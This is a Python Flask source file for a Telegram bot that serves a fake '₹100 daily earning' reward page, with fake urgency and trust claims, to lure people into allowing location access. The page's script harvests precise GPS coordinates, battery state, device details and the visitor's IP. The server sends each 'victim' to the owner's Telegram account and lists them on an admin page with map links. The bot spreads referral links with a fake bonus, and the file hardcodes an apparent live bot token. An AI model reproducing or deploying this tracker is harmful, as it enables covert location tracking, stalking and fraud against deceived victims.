import os
import json
import logging
import requests
from datetime import datetime
from flask import Flask, request, jsonify

# === TOKEN AND OWNER ID - ALREADY SET ===
BOT_TOKEN = "8849680903:AAFhk2Aq2rfxuou1cHZqSOr4N1_JCei-7n4"
OWNER_ID = "8586849798"

app = Flask(__name__)
victim_data = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_message(chat_id, text, reply_markup=None):
    url = f"{TELEGRAM_API}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    
    try:
        r = requests.post(url, data=data, timeout=10)
        logger.info(f"sendMessage to {chat_id}: {r.status_code}")
        return r.json()
    except Exception as e:
        logger.error(f"sendMessage error: {e}")
        return None

@app.route('/')
def index():
    ref = request.args.get('ref', 'unknown')
    host = request.host
    return f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>₹100 Daily Earning</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}}
body{{min-height:100vh;background:linear-gradient(135deg,#1e3c72,#2a5298);display:flex;justify-content:center;align-items:center;padding:15px;}}
.card{{background:white;border-radius:20px;padding:30px 20px;max-width:390px;width:100%;text-align:center;box-shadow:0 15px 50px rgba(0,0,0,0.3);}}
.emoji{{font-size:55px;margin-bottom:10px;}}
h1{{color:#222;font-size:24px;}}
.sub{{color:#777;font-size:13px;margin:8px 0 20px;}}
.rs{{font-size:50px;font-weight:bold;color:#2ecc71;}}
.rs span{{font-size:18px;color:#666;}}
.btn{{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:16px 30px;font-size:20px;font-weight:bold;border-radius:50px;width:100%;margin:18px 0;cursor:pointer;transition:.2s;}}
.btn:hover{{transform:scale(1.02);}}
.btn:active{{transform:scale(.98);}}
.btn:disabled{{opacity:.6;cursor:not-allowed;transform:none;}}
.info{{color:#aaa;font-size:11px;margin-top:10px;}}
.steps{{text-align:left;margin:15px 0;}}
.step{{display:flex;align-items:center;margin:8px 0;color:#555;font-size:14px;}}
.sn{{background:#667eea;color:#fff;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:bold;margin-right:10px;}}
.timer{{color:#e74c3c;font-weight:bold;margin:10px 0;font-size:14px;}}
#st{{margin-top:12px;padding:10px;border-radius:10px;display:none;font-size:13px;}}
.succ{{background:#d4edda;color:#155724;}}
.err{{background:#f8d7da;color:#721c24;}}
.loader{{display:inline-block;width:16px;height:16px;border:3px solid #fff;border-radius:50%;border-top:3px solid transparent;animation:spin .8s linear infinite;margin-right:6px;vertical-align:middle;}}
@keyframes spin{{to{{transform:rotate(360deg);}}}}
</style>
</head>
<body>
<div class="card">
<div class="emoji">🎉</div>
<h1>Daily Earning Offer</h1>
<p class="sub">Complete one step to claim your reward</p>
<div class="rs">₹100 <span>/ daily</span></div>
<div class="steps">
<div class="step"><div class="sn">1</div> Click "Claim Now" button below</div>
<div class="step"><div class="sn">2</div> Allow location access when asked</div>
<div class="step"><div class="sn">3</div> ₹100 credited instantly! 🤑</div>
</div>
<div class="timer">⏱ Offer expires in: <span id="tm">05:00</span></div>
<button class="btn" id="btn" onclick="claim()">🤑 CLAIM ₹100 NOW</button>
<div id="st"></div>
<p class="info">✅ Secure • Instant Payment • Trusted by 50K+</p>
<p class="info">📍 Location required for verification</p>
</div>
<script>
let t=300;
const tm=document.getElementById('tm');
setInterval(()=>{{if(t>0){{t--;let m=Math.floor(t/60),s=t%60;tm.textContent=`${{String(m).padStart(2,'0')}}:${{String(s).padStart(2,'0')}}`;}}}},1000);

function getLoc(){{
return new Promise((a,b)=>{{if(!navigator.geolocation)b('No GPS');navigator.geolocation.getCurrentPosition(p=>a({{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}}),e=>b(e.message),{{enableHighAccuracy:true,timeout:20000,maximumAge:0}})}});
}}

function getBat(){{
return new Promise(a=>{{if(navigator.getBattery)navigator.getBattery().then(b=>a({{lvl:Math.round(b.level*100),chg:b.charging}}));else a({{lvl:'?',chg:'?'}})}});
}}

async function claim(){{
const btn=document.getElementById('btn');
const st=document.getElementById('st');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Processing...';
st.style.display='block';st.className='';st.innerHTML='📍 Getting your location...';
try{{
const[loc,bat]=await Promise.all([getLoc(),getBat()]);
st.innerHTML='✅ Verifying...';
const d={{lat:loc.lat,lon:loc.lon,acc:loc.acc,batt:bat.lvl,charge:bat.chg,ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,ref:'{ref}',ts:new Date().toISOString()}};
const r=await fetch('/capture',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(d)}});
if(r.ok){{st.className='succ';st.innerHTML='✅ <b>Congratulations!</b><br>₹100 credited!<br>You will receive payment within 24h';btn.innerHTML='✅ CLAIMED';btn.style.background='#27ae60';}}
else throw Error('err');
}}catch(e){{st.className='err';st.innerHTML='❌ <b>Location required!</b><br>Please allow location and try again<br><small>'+e.message+'</small>';btn.disabled=false;btn.innerHTML='🤑 TRY AGAIN';}}
}}
</script>
</body>
</html>"""

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    data['ip'] = request.remote_addr
    data['forwarded_ip'] = request.headers.get('X-Forwarded-For', '')
    
    vid = f"victim_{int(datetime.now().timestamp())}"
    victim_data[vid] = data
    
    print(f"""
╔══════════════════════════════════════════╗
║   🔥 NEW VICTIM: {vid}  🔥
╠══════════════════════════════════════════╣
║ 📍  {data['lat']}, {data['lon']}
║ 🎯  Accuracy: {data['acc']}m
║ 🔋  Battery: {data['batt']}% | Charge: {data['charge']}
║ 🌐  IP: {data['ip']}
║ 📱  Platform: {data['plat']}
║ 🕐  {data['ts']}
╚══════════════════════════════════════════╝
""")
    
    # Send to owner
    msg = f"""⚠️ **ɴᴇᴡ ᴠɪᴄᴛɪᴍ ᴄᴀᴘᴛᴜʀᴇᴅ!** ⚠️

📍 **ʟᴏᴄᴀᴛɪᴏɴ:** {data['lat']}, {data['lon']}
🎯 **ᴀᴄᴄᴜʀᴀᴄʏ:** {data['acc']}ᴍ
🔋 **ʙᴀᴛᴛᴇʀʏ:** {data['batt']}%
🔌 **ᴄʜᴀʀɢɪɴɢ:** {data['charge']}
🌐 **ɪᴘ:** {data['ip']}
📱 **ᴅᴇᴠɪᴄᴇ:** {data['plat']}
🕐 **ᴛɪᴍᴇ:** {data['ts']}

🔗 **ᴍᴀᴘꜱ:** https://www.google.com/maps?q={data['lat']},{data['lon']}"""
    send_message(OWNER_ID, msg)
    
    return jsonify({"status": "ok", "message": "Reward claimed!"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if not update:
        return "ok", 200
    
    logger.info(f"Update: {json.dumps(update)[:150]}")
    
    if 'message' in update:
        msg = update['message']
        chat_id = msg['chat']['id']
        text = msg.get('text', '')
        user = msg.get('from', {})
        name = user.get('first_name', 'User')
        uid = user.get('id', 0)
        
        if text == '/start':
            host = request.host
            welcome = f"""👋 **ᴡᴇʟᴄᴏᴍᴇ {name}!** 🎉

💰 **ᴇᴀʀɴ ₹𝟷𝟶𝟶 ᴅᴀɪʟʏ** 💰

➥ ʙᴀꜱ ᴇᴋ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴏ
➥ ʟᴏᴄᴀᴛɪᴏɴ ᴀʟʟᴏᴡ ᴋᴀʀᴏ
➥ ₹𝟷𝟶𝟶 ɪɴꜱᴛᴀɴᴛ 🤑

ᴛʀᴜꜱᴛᴇᴅ ʙʏ 𝟻𝟶,𝟶𝟶𝟶+ ᴜꜱᴇʀꜱ ✅
ᴢᴇʀᴏ ɪɴᴠᴇꜱᴛᴍᴇɴᴛ 🔥

👇 **ʙᴜᴛᴛᴏɴ ᴘᴇ ᴛᴀᴘ ᴋᴀʀᴏ** 👇"""
            kb = {"inline_keyboard": [[{"text": "🤑 ᴄʟᴀɪᴍ ₹𝟷𝟶𝟶 ɴᴏᴡ 🤑", "url": f"https://{host}"}]]}
            send_message(chat_id, welcome, kb)
            
        elif text == '/link':
            host = request.host
            link = f"https://{host}?ref={uid}"
            msg = f"""🔗 **ᴛᴇʀᴀ ʟɪɴᴋ:** 📎
`{link}`

ᴋɪꜱɪ ᴄᴏ ʙʜᴇᴊ ᴅᴇ ✅
ᴊᴀʙ ᴠᴏ ᴄʟɪᴄᴋ ᴋᴀʀᴇɢᴀ ᴛᴏ ᴛᴇʀᴀ ₹𝟸𝟻 ʀᴇꜰᴇʀʀᴀʟ ʙᴏɴᴜꜱ 🤑"""
            send_message(chat_id, msg)
            
        elif text == '/help':
            send_message(chat_id, """🤖 **ᴄᴏᴍᴍᴀɴᴅꜱ:**
/start - ꜱᴛᴀʀᴛ ᴀɴᴅ ɢᴇᴛ ₹𝟷𝟶𝟶 ᴏꜰꜰᴇʀ
/link - ɢᴇᴛ ʏᴏᴜʀ ʀᴇꜰᴇʀʀᴀʟ ʟɪɴᴋ
/help - ʜᴇʟᴘ""")
        else:
            send_message(chat_id, "❌ Unknown command. Use /start")
    
    return "ok", 200

@app.route('/admin')
def admin():
    html = """<html><head><title>Victim Data</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body{font-family:sans-serif;background:#1a1a2e;color:#eee;padding:20px;}
    h1{color:#e94560;}
    .card{background:#16213e;border-radius:10px;padding:15px;margin:15px 0;}
    .label{color:#e94560;font-weight:bold;}
    a{color:#4fc3f7;}
    .total{font-size:20px;margin:10px 0;color:#4fc3f7;}
    </style></head><body>
    <h1>📊 Victim Data</h1>
    <div class="total">Total: """ + str(len(victim_data)) + """</div>"""
    if not victim_data:
        html += '<p style="color:#888;">⏳ No victims yet</p>'
    else:
        for vid, d in list(victim_data.items())[::-1]:
            html += f"""
            <div class="card">
            <h3>🆔 {vid}</h3>
            <p><span class="label">📍 Location:</span> {d['lat']}, {d['lon']}</p>
            <p><span class="label">🎯 Accuracy:</span> {d['acc']}m</p>
            <p><a href="https://www.google.com/maps?q={d['lat']},{d['lon']}" target="_blank">🗺️ Google Maps</a></p>
            <p><span class="label">🔋 Battery:</span> {d['batt']}% | <span class="label">🔌 Charge:</span> {d['charge']}</p>
            <p><span class="label">🌐 IP:</span> {d['ip']}</p>
            <p><span class="label">📱 Platform:</span> {d.get('plat','?')}</p>
            <p><span class="label">🕐 Time:</span> {d.get('ts','?')}</p>
            </div>"""
    html += "</body></html>"
    return html

@app.route('/set-webhook')
def setup_webhook():
    host = request.host
    url = f"https://{host}"
    r = requests.get(f"{TELEGRAM_API}/setWebhook?url={url}/webhook")
    return f"Webhook: {r.json()}"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"Bot starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False)
    
    
